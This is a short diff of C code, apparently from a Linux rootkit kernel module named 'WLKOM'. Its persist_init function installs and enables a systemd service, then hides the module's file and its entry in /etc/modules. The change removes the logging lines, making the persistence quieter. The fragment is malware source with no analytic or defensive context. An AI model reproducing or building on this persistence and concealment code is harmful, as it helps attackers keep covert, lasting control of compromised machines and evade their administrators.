@@ -67,10 +67,7 @@ int persist_init(void)
     ret = write_file(WLKOM_SERVICE_PATH, service_content,
                      sizeof(service_content) - 1);
     if (ret < 0)
-    {
-        pr_err("WLKOM persist: cannot write service file (%d)\n", ret);
         return ret;
-    }
 
     run_cmd("systemctl daemon-reload");
     run_cmd("systemctl enable wlkom.service");
@@ -79,7 +76,6 @@ int persist_init(void)
     hide_file("wlkom");
     hide_line("/etc/modules", "wlkom");
 
-    pr_info("WLKOM persist: persistence installed\n");
     return 0;
 }
 
